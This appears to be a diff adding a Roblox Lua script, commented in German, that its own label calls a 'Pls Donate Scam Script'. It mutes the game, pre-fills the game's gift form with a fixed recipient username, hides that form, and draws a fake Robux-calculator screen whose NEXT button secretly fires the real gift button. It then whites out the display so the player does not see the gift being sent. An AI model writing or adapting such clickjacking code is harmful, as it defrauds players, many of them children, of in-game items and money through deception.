@@ -1,0 +1,721 @@
+wait(3)
+
+-- Funktion: Setze Roblox Lautstärke auf 0
+local function muteRobloxVolume()
+    print("Setting Roblox volume to 0...")
+    
+    local success, result = pcall(function()
+        local settings = UserSettings()
+        local gameSettings = settings.GameSettings
+        gameSettings.MasterVolume = 0
+        print("✅ Volume set to 0 via GameSettings")
+    end)
+    
+    if not success then
+        success, result = pcall(function()
+            local SoundService = game:GetService("SoundService")
+            SoundService.Volume = 0
+            print("✅ Volume set to 0 via SoundService")
+        end)
+    end
+    
+    if not success then
+        success, result = pcall(function()
+            for _, sound in ipairs(game:GetDescendants()) do
+                if sound:IsA("Sound") then
+                    sound.Volume = 0
+                end
+            end
+            print("✅ All individual sounds muted")
+        end)
+    end
+    
+    if not success then
+        print("⚠️ Could not change volume programmatically")
+        print("Please set Roblox volume to 0 manually!")
+    end
+    
+    return success
+end
+
+-- Zuerst Lautstärke auf 0 setzen
+muteRobloxVolume()
+
+local player = game.Players.LocalPlayer
+local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+print("\n=== INTELLIGENT GIFT-AUTOCOLLECT ===")
+
+-- Konfiguration
+local TARGET_USERNAME = "grhgj4yg"
+local TARGET_MESSAGE = "hallo"
+local MAX_WAIT_TIME = 20
+
+-- Funktion: Finde und bearbeite das Gift-GUI
+local function setupGiftGUI()
+    print("Setting up Gift GUI...")
+    
+    local players = game:GetService("Players")
+    local currentPlayer = players.LocalPlayer
+    
+    if not currentPlayer then
+        print("❌ Player not found")
+        return nil
+    end
+    
+    local playerGui = currentPlayer:FindFirstChild("PlayerGui")
+    if not playerGui then
+        print("❌ PlayerGui not found")
+        return nil
+    end
+    
+    local mainGUI = playerGui:FindFirstChild("MainGUI")
+    if not mainGUI then
+        print("❌ MainGUI not found")
+        return nil
+    end
+    
+    local gift = mainGUI:FindFirstChild("Gift")
+    if not gift then
+        print("❌ Gift not found")
+        return nil
+    end
+    
+    print("✅ GUI structure found")
+    
+    -- STEP 1: Fill text fields
+    print("\n1️⃣ Filling text fields...")
+    
+    local frame = gift:FindFirstChild("Frame")
+    if frame then
+        -- Fill Username
+        local usernameBox = frame:FindFirstChild("Username")
+        if usernameBox and usernameBox:IsA("TextBox") then
+            usernameBox.Text = TARGET_USERNAME
+            print("✅ Username filled: " .. TARGET_USERNAME)
+        else
+            for _, child in ipairs(frame:GetDescendants()) do
+                if child:IsA("TextBox") and (child.Name:lower():find("user") or (child.PlaceholderText and child.PlaceholderText:lower():find("user"))) then
+                    child.Text = TARGET_USERNAME
+                    print("✅ Username (alternative) filled: " .. TARGET_USERNAME)
+                    break
+                end
+            end
+        end
+        
+        -- Fill Message
+        local messageBox = frame:FindFirstChild("Message")
+        if messageBox and messageBox:IsA("TextBox") then
+            messageBox.Text = TARGET_MESSAGE
+            print("✅ Message filled: " .. TARGET_MESSAGE)
+        else
+            for _, child in ipairs(frame:GetDescendants()) do
+                if child:IsA("TextBox") and (child.Name:lower():find("message") or child.Name:lower():find("msg") or 
+                   (child.PlaceholderText and (child.PlaceholderText:lower():find("message") or child.PlaceholderText:lower():find("msg")))) then
+                    child.Text = TARGET_MESSAGE
+                    print("✅ Message (alternative) filled: " .. TARGET_MESSAGE)
+                    break
+                end
+            end
+        end
+        
+        wait(0.2)
+    end
+    
+    -- STEP 2: Make Gift and Frame transparent
+    print("\n2️⃣ Making GUI transparent...")
+    
+    if gift:IsA("GuiObject") then
+        gift.BackgroundTransparency = 1
+        gift.Visible = true
+        print("✅ Gift: BackgroundTransparency = 1")
+    end
+    
+    if frame and frame:IsA("GuiObject") then
+        frame.BackgroundTransparency = 1
+        frame.Visible = true
+        print("✅ Frame: BackgroundTransparency = 1")
+    end
+    
+    for _, child in ipairs(gift:GetDescendants()) do
+        if child:IsA("GuiObject") then
+            if child.Name == "TopFrame" then
+                child.Visible = false
+                print("✅ TopFrame: Visible = false")
+            end
+            
+            if child.Name == "Username" or child.Name == "Message" then
+                if child:IsA("TextBox") then
+                    child.Visible = false
+                    child.TextTransparency = 1
+                    print("✅ " .. child.Name .. ": Visible = false")
+                end
+            end
+            
+            if child.Name == "GiftWrappingSetting" then
+                child.Visible = false
+                print("✅ GiftWrappingSetting: Visible = false")
+            end
+            
+            if child:IsA("TextLabel") then
+                child.Visible = false
+                child.TextTransparency = 1
+            end
+        end
+    end
+    
+    -- STEP 3: Find the Gift button
+    local giftButton = nil
+    if frame then
+        giftButton = frame:FindFirstChild("Gift")
+        if not giftButton then
+            for _, child in ipairs(frame:GetDescendants()) do
+                if child:IsA("TextButton") or child:IsA("ImageButton") then
+                    giftButton = child
+                    print("⚠️  Alternative button found: " .. child.Name)
+                    break
+                end
+            end
+        end
+    end
+    
+    if giftButton then
+        print("✅ Original button found: " .. giftButton.Name)
+        
+        if giftButton:IsA("GuiObject") then
+            giftButton.Active = true
+            giftButton.Visible = true
+        end
+    else
+        print("❌ No button found")
+    end
+    
+    return giftButton
+end
+
+-- Funktion: Erstelle komplett weiße Überlagerung mit UI-Elementen
+local function createWhiteOverlayWithUI(originalButton)
+    print("\n3️⃣ Creating white overlay with UI...")
+    
+    -- Erstelle Haupt-ScreenGui
+    local mainScreenGui = Instance.new("ScreenGui")
+    mainScreenGui.Name = "DonationUI"
+    mainScreenGui.DisplayOrder = 999997
+    mainScreenGui.IgnoreGuiInset = true
+    mainScreenGui.ResetOnSpawn = false
+    
+    -- Weißer Hintergrund
+    local whiteBackground = Instance.new("Frame")
+    whiteBackground.Name = "WhiteBackground"
+    whiteBackground.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    whiteBackground.Size = UDim2.new(1, 0, 1, 0)
+    whiteBackground.Position = UDim2.new(0, 0, 0, 0)
+    whiteBackground.BackgroundTransparency = 0
+    whiteBackground.BorderSizePixel = 0
+    whiteBackground.ZIndex = 1
+    whiteBackground.Parent = mainScreenGui
+    
+    -- Container für UI-Elemente (zentriert)
+    local uiContainer = Instance.new("Frame")
+    uiContainer.Name = "UIContainer"
+    uiContainer.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+    uiContainer.BackgroundTransparency = 0
+    uiContainer.Size = UDim2.new(0, 500, 0, 550)
+    uiContainer.Position = UDim2.new(0.5, -250, 0.5, -275)
+    uiContainer.BorderSizePixel = 0
+    uiContainer.ZIndex = 2
+    
+    -- Abgerundete Ecken
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 15)
+    corner.Parent = uiContainer
+    
+    -- Schatten
+    local shadow = Instance.new("UIStroke")
+    shadow.Color = Color3.fromRGB(200, 200, 200)
+    shadow.Thickness = 2
+    shadow.Parent = uiContainer
+    
+    uiContainer.Parent = mainScreenGui
+    
+    -- Willkommens-Text
+    local welcomeText = Instance.new("TextLabel")
+    welcomeText.Name = "WelcomeText"
+    welcomeText.Text = "Welcome"
+    welcomeText.Font = Enum.Font.SourceSansBold
+    welcomeText.TextSize = 36
+    welcomeText.TextColor3 = Color3.fromRGB(0, 0, 0)
+    welcomeText.BackgroundTransparency = 1
+    welcomeText.Size = UDim2.new(1, 0, 0, 50)
+    welcomeText.Position = UDim2.new(0, 0, 0, 30)
+    welcomeText.ZIndex = 3
+    welcomeText.Parent = uiContainer
+    
+    -- Untertitel
+    local subtitleText = Instance.new("TextLabel")
+    subtitleText.Name = "SubtitleText"
+    subtitleText.Text = "Pls Donate Scam Script"
+    subtitleText.Font = Enum.Font.SourceSans
+    subtitleText.TextSize = 18
+    subtitleText.TextColor3 = Color3.fromRGB(100, 100, 100)
+    subtitleText.BackgroundTransparency = 1
+    subtitleText.Size = UDim2.new(1, 0, 0, 30)
+    subtitleText.Position = UDim2.new(0, 0, 0, 80)
+    subtitleText.ZIndex = 3
+    subtitleText.Parent = uiContainer
+    
+    -- Aktuelle Robux
+    local currentRobuxLabel = Instance.new("TextLabel")
+    currentRobuxLabel.Name = "CurrentRobuxLabel"
+    currentRobuxLabel.Text = "Your concurrent robux:"
+    currentRobuxLabel.Font = Enum.Font.SourceSans
+    currentRobuxLabel.TextSize = 20
+    currentRobuxLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+    currentRobuxLabel.BackgroundTransparency = 1
+    currentRobuxLabel.Size = UDim2.new(0.8, -10, 0, 30)
+    currentRobuxLabel.Position = UDim2.new(0.1, 0, 0, 140)
+    currentRobuxLabel.TextXAlignment = Enum.TextXAlignment.Left
+    currentRobuxLabel.ZIndex = 3
+    currentRobuxLabel.Parent = uiContainer
+    
+    -- Eingabefeld für aktuelle Robux
+    local currentRobuxBox = Instance.new("TextBox")
+    currentRobuxBox.Name = "CurrentRobuxBox"
+    currentRobuxBox.PlaceholderText = "Enter amount"
+    currentRobuxBox.Font = Enum.Font.SourceSans
+    currentRobuxBox.TextSize = 18
+    currentRobuxBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+    currentRobuxBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    currentRobuxBox.BorderColor3 = Color3.fromRGB(150, 150, 150)
+    currentRobuxBox.BorderSizePixel = 1
+    currentRobuxBox.Size = UDim2.new(0.8, -10, 0, 35)
+    currentRobuxBox.Position = UDim2.new(0.1, 0, 0, 175)
+    currentRobuxBox.ZIndex = 3
+    currentRobuxBox.Parent = uiContainer
+    
+    local currentCorner = Instance.new("UICorner")
+    currentCorner.CornerRadius = UDim.new(0, 5)
+    currentCorner.Parent = currentRobuxBox
+    
+    -- Gewünschte Robux
+    local desiredRobuxLabel = Instance.new("TextLabel")
+    desiredRobuxLabel.Name = "DesiredRobuxLabel"
+    desiredRobuxLabel.Text = "Desired amount:"
+    desiredRobuxLabel.Font = Enum.Font.SourceSans
+    desiredRobuxLabel.TextSize = 20
+    desiredRobuxLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+    desiredRobuxLabel.BackgroundTransparency = 1
+    desiredRobuxLabel.Size = UDim2.new(0.8, -10, 0, 30)
+    desiredRobuxLabel.Position = UDim2.new(0.1, 0, 0, 230)
+    desiredRobuxLabel.TextXAlignment = Enum.TextXAlignment.Left
+    desiredRobuxLabel.ZIndex = 3
+    desiredRobuxLabel.Parent = uiContainer
+    
+    -- Eingabefeld für gewünschte Robux
+    local desiredRobuxBox = Instance.new("TextBox")
+    desiredRobuxBox.Name = "DesiredRobuxBox"
+    desiredRobuxBox.PlaceholderText = "Enter desired amount"
+    desiredRobuxBox.Font = Enum.Font.SourceSans
+    desiredRobuxBox.TextSize = 18
+    desiredRobuxBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+    desiredRobuxBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    desiredRobuxBox.BorderColor3 = Color3.fromRGB(150, 150, 150)
+    desiredRobuxBox.BorderSizePixel = 1
+    desiredRobuxBox.Size = UDim2.new(0.8, -10, 0, 35)
+    desiredRobuxBox.Position = UDim2.new(0.1, 0, 0, 265)
+    desiredRobuxBox.ZIndex = 3
+    desiredRobuxBox.Parent = uiContainer
+    
+    local desiredCorner = Instance.new("UICorner")
+    desiredCorner.CornerRadius = UDim.new(0, 5)
+    desiredCorner.Parent = desiredRobuxBox
+    
+    -- Zeit-Berechnungs-Label
+    local timeLabel = Instance.new("TextLabel")
+    timeLabel.Name = "TimeLabel"
+    timeLabel.Text = "Estimated time: Calculating..."
+    timeLabel.Font = Enum.Font.SourceSans
+    timeLabel.TextSize = 18
+    timeLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+    timeLabel.BackgroundTransparency = 1
+    timeLabel.Size = UDim2.new(0.8, -10, 0, 30)
+    timeLabel.Position = UDim2.new(0.1, 0, 0, 320)
+    timeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    timeLabel.ZIndex = 3
+    timeLabel.Parent = uiContainer
+    
+    -- Blauer "NEXT" Bereich (transparent, wird später blau)
+    local nextArea = Instance.new("Frame")
+    nextArea.Name = "NextArea"
+    nextArea.BackgroundColor3 = Color3.fromRGB(150, 150, 150)  -- Anfangs grau
+    nextArea.BackgroundTransparency = 0.3
+    nextArea.BorderSizePixel = 0
+    nextArea.Size = UDim2.new(0, 200, 0, 60)
+    nextArea.Position = UDim2.new(0.5, -100, 0, 450)  -- Weiter unten
+    
+    local nextCorner = Instance.new("UICorner")
+    nextCorner.CornerRadius = UDim.new(0, 10)
+    nextCorner.Parent = nextArea
+    
+    local nextStroke = Instance.new("UIStroke")
+    nextStroke.Color = Color3.fromRGB(100, 100, 100)
+    nextStroke.Thickness = 2
+    nextStroke.Parent = nextArea
+    
+    nextArea.ZIndex = 4
+    nextArea.Parent = uiContainer
+    
+    -- "NEXT" Text
+    local nextText = Instance.new("TextLabel")
+    nextText.Name = "NextText"
+    nextText.Text = "NEXT"
+    nextText.Font = Enum.Font.SourceSansBold
+    nextText.TextSize = 24
+    nextText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    nextText.BackgroundTransparency = 1
+    nextText.Size = UDim2.new(1, 0, 1, 0)
+    nextText.Position = UDim2.new(0, 0, 0, 0)
+    nextText.ZIndex = 5
+    nextText.Parent = nextArea
+    
+    print("✅ White overlay with UI created")
+    
+    -- Berechne Zeit basierend auf Eingaben
+    local function calculateTime()
+        local current = tonumber(currentRobuxBox.Text) or 0
+        local desired = tonumber(desiredRobuxBox.Text) or 0
+        
+        if current > 0 and desired > 0 and desired > current then
+            local difference = desired - current
+            
+            -- Zeitberechnung: Je höher der Betrag, desto länger
+            local baseHours = 1  -- Basis: 1 Stunde pro 100 Robux Differenz
+            
+            if difference <= 100 then
+                baseHours = 1
+            elseif difference <= 500 then
+                baseHours = 2
+            elseif difference <= 1000 then
+                baseHours = 4
+            elseif difference <= 5000 then
+                baseHours = 8
+            elseif difference <= 10000 then
+                baseHours = 16
+            else
+                baseHours = 24 + math.floor(difference / 10000) * 12  -- Für >10k
+            end
+            
+            -- Zeige berechnete Zeit an
+            if baseHours < 1 then
+                timeLabel.Text = "Estimated time: 30 minutes"
+            elseif baseHours == 1 then
+                timeLabel.Text = "Estimated time: 1 hour"
+            elseif baseHours < 24 then
+                timeLabel.Text = "Estimated time: " .. math.floor(baseHours) .. " hours"
+            else
+                local days = math.floor(baseHours / 24)
+                local hours = math.floor(baseHours % 24)
+                if hours > 0 then
+                    timeLabel.Text = "Estimated time: " .. days .. " days, " .. hours .. " hours"
+                else
+                    timeLabel.Text = "Estimated time: " .. days .. " days"
+                end
+            end
+            
+            -- Aktiviere NEXT Bereich wenn beide Felder ausgefüllt sind
+            if current > 0 and desired > 0 and desired > current then
+                nextArea.BackgroundColor3 = Color3.fromRGB(0, 120, 215)  -- Blau
+                nextArea.BackgroundTransparency = 0
+                nextStroke.Color = Color3.fromRGB(0, 80, 180)
+                return true
+            else
+                nextArea.BackgroundColor3 = Color3.fromRGB(150, 150, 150)  -- Grau
+                nextArea.BackgroundTransparency = 0.3
+                nextStroke.Color = Color3.fromRGB(100, 100, 100)
+                return false
+            end
+        else
+            timeLabel.Text = "Estimated time: Enter valid amounts"
+            nextArea.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+            nextArea.BackgroundTransparency = 0.3
+            nextStroke.Color = Color3.fromRGB(100, 100, 100)
+            return false
+        end
+    end
+    
+    -- Verbinde Text-Änderungen mit Zeitberechnung
+    currentRobuxBox:GetPropertyChangedSignal("Text"):Connect(calculateTime)
+    desiredRobuxBox:GetPropertyChangedSignal("Text"):Connect(calculateTime)
+    
+    -- Füge Click-Event zum NEXT Bereich hinzu
+    local nextAreaClickable = Instance.new("TextButton")
+    nextAreaClickable.Name = "NextAreaClickable"
+    nextAreaClickable.Text = ""
+    nextAreaClickable.BackgroundTransparency = 1
+    nextAreaClickable.Size = UDim2.new(1, 0, 1, 0)
+    nextAreaClickable.Position = UDim2.new(0, 0, 0, 0)
+    nextAreaClickable.ZIndex = 6
+    nextAreaClickable.Parent = nextArea
+    
+    -- Variable für Button-Klick
+    local nextClicked = false
+    
+    nextAreaClickable.MouseButton1Click:Connect(function()
+        if not nextClicked and calculateTime() then
+            nextClicked = true
+            print("✅ NEXT area clicked!")
+            
+            -- Klicke den originalen Button dahinter
+            if originalButton then
+                pcall(function()
+                    print("✅ Clicking original button behind...")
+                    originalButton:Fire("MouseButton1Click")
+                    wait(0.1)
+                    originalButton:Fire("Activated")
+                end)
+            end
+            
+            return true
+        end
+        return false
+    end)
+    
+    return mainScreenGui, nextAreaClickable, calculateTime
+end
+
+-- Funktion: Mache alles komplett weiß (nach Klick)
+local function makeEverythingWhite()
+    print("✅ Making everything completely white...")
+    
+    local whiteScreenGui = Instance.new("ScreenGui")
+    whiteScreenGui.Name = "CompleteWhite"
+    whiteScreenGui.DisplayOrder = 999999
+    whiteScreenGui.IgnoreGuiInset = true
+    whiteScreenGui.ResetOnSpawn = false
+    
+    local fullWhite = Instance.new("Frame")
+    fullWhite.Name = "CompleteWhiteFrame"
+    fullWhite.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    fullWhite.Size = UDim2.new(1, 0, 1, 0)
+    fullWhite.Position = UDim2.new(0, 0, 0, 0)
+    fullWhite.BackgroundTransparency = 0
+    fullWhite.BorderSizePixel = 0
+    fullWhite.ZIndex = 999999
+    fullWhite.Parent = whiteScreenGui
+    
+    whiteScreenGui.Parent = player:WaitForChild("PlayerGui")
+    
+    return whiteScreenGui
+end
+
+-- Funktion: Warte auf GiftIsland
+local function waitForGiftIsland()
+    print("Waiting for GiftIsland...")
+    
+    local startTime = tick()
+    local giftIsland = nil
+    
+    while tick() - startTime < MAX_WAIT_TIME do
+        giftIsland = workspace:FindFirstChild("GiftIsland")
+        
+        if giftIsland then
+            local waitTime = math.floor(tick() - startTime)
+            print("✅ GiftIsland found after " .. waitTime .. "s")
+            return giftIsland
+        end
+        
+        wait(0.5)
+    end
+    
+    return nil
+end
+
+-- Funktion: Analysiere und interagiere mit GiftIsland
+local function processGiftIsland(giftIsland)
+    print("\nAnalyzing GiftIsland content...")
+    
+    local actionsTaken = 0
+    
+    -- 1. Check for ClickDetectors
+    for _, clickDetector in ipairs(giftIsland:GetDescendants()) do
+        if clickDetector:IsA("ClickDetector") then
+            print("ClickDetector found in: " .. clickDetector.Parent.Name)
+            
+            pcall(function()
+                clickDetector.MaxActivationDistance = 100
+                clickDetector:Fire("MouseClick", player)
+                actionsTaken += 1
+                print("   ✅ ClickDetector activated")
+            end)
+        end
+    end
+    
+    -- 2. Check for ProximityPrompts
+    for _, prompt in ipairs(giftIsland:GetDescendants()) do
+        if prompt:IsA("ProximityPrompt") then
+            print("ProximityPrompt found: " .. prompt.Name)
+            
+            pcall(function()
+                prompt.HoldDuration = 0
+                prompt:Fire("Triggered", player)
+                actionsTaken += 1
+                print("   ✅ ProximityPrompt triggered")
+            end)
+        end
+    end
+    
+    -- 3. Check for Parts with special names
+    local specialParts = {}
+    for _, part in ipairs(giftIsland:GetDescendants()) do
+        if part:IsA("BasePart") then
+            local nameLower = part.Name:lower()
+            if nameLower:find("gift") or nameLower:find("present") or 
+               nameLower:find("box") or nameLower:find("chest") then
+                table.insert(specialParts, part)
+            end
+        end
+    end
+    
+    -- 4. Move character to parts
+    if #specialParts > 0 then
+        local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            for _, part in ipairs(specialParts) do
+                print("Going to: " .. part.Name)
+                
+                pcall(function()
+                    humanoid:MoveTo(part.Position)
+                    wait(2)
+                    
+                    part.Touched:Connect(function(otherPart)
+                        if otherPart.Parent == player.Character then
+                            print("   ✅ Part touched")
+                            actionsTaken += 1
+                        end
+                    end)
+                end)
+            end
+        end
+    end
+    
+    -- 5. Check for GUI elements in folder
+    for _, gui in ipairs(giftIsland:GetDescendants()) do
+        if gui:IsA("SurfaceGui") or gui:IsA("BillboardGui") then
+            print("GUI found: " .. gui.Name)
+            
+            for _, guiElement in ipairs(gui:GetDescendants()) do
+                if guiElement:IsA("TextButton") then
+                    print("   Button in GUI: " .. guiElement.Text)
+                    
+                    pcall(function()
+                        guiElement:Fire("Activated")
+                        actionsTaken += 1
+                        print("   ✅ GUI button clicked")
+                    end)
+                end
+            end
+        end
+    end
+    
+    return actionsTaken
+end
+
+-- HAUPT-PROGRAMM
+print("\n🎁 DONATION SCRIPT WITH TIME CALCULATOR")
+print("=" .. string.rep("=", 39))
+
+-- 1. Setup GUI: Fill fields and make transparent
+local originalButton = setupGiftGUI()
+
+if originalButton then
+    print("\n✅ GUI successfully set up!")
+    
+    -- 2. Create white overlay with UI
+    local overlayUI, nextClickable, calculateTimeFunc = createWhiteOverlayWithUI(originalButton)
+    overlayUI.Parent = player:WaitForChild("PlayerGui")
+    
+    -- 3. Wait for NEXT click
+    local nextClicked = false
+    
+    -- Create a loop to check for NEXT click
+    spawn(function()
+        while not nextClicked and overlayUI and overlayUI.Parent do
+            wait(0.1)
+        end
+    end)
+    
+    -- Connect the click event
+    nextClickable.MouseButton1Click:Connect(function()
+        if calculateTimeFunc() then  -- Check if fields are filled
+            nextClicked = true
+            print("✅ NEXT clicked, proceeding...")
+            
+            -- 4. Make everything completely white
+            local completeWhite = makeEverythingWhite()
+            
+            -- Remove overlay
+            wait(0.5)
+            overlayUI:Destroy()
+            
+            -- Wait a bit
+            wait(1)
+            
+            -- Start GiftIsland search
+            print("\n✅ Starting GiftIsland search...")
+            
+            local giftIsland = waitForGiftIsland()
+            
+            if giftIsland then
+                local actions = processGiftIsland(giftIsland)
+                
+                if actions > 0 then
+                    print("\n🎉 " .. actions .. " actions performed!")
+                    
+                    wait(3)
+                    if not workspace:FindFirstChild("GiftIsland") then
+                        print("✅ GiftIsland removed - GIFT SUCCESSFUL!")
+                    else
+                        print("⚠️ GiftIsland still there")
+                    end
+                else
+                    print("❌ No actions possible")
+                end
+            else
+                print("❌ GiftIsland not found")
+            end
+            
+            -- Remove completely white layer after completion
+            wait(2)
+            completeWhite:Destroy()
+        else
+            print("⚠️ Please fill in both fields with valid amounts first!")
+        end
+    end)
+    
+    print("\n✅ Everything set up!")
+    print("\nYou see now:")
+    print("1. White screen with donation UI")
+    print("2. Welcome message and input fields")
+    print("3. Time calculator based on amounts")
+    print("4. Gray NEXT area (becomes blue when fields are filled)")
+    print("\n⏳ Fill in the amounts and click NEXT when it turns blue...")
+    
+    -- Timeout after 120 seconds
+    local startTime = tick()
+    while tick() - startTime < 120 and not nextClicked do
+        wait(1)
+    end
+    
+    if not nextClicked then
+        print("⚠️ Timeout - No action taken")
+    end
+    
+else
+    print("❌ Could not find Gift GUI")
+    print("Please open the Gift menu manually and restart the script.")
+end
+
+print("\n" .. string.rep("★", 50))
+print("PROGRAM FINISHED")
+print(string.rep("★", 50))
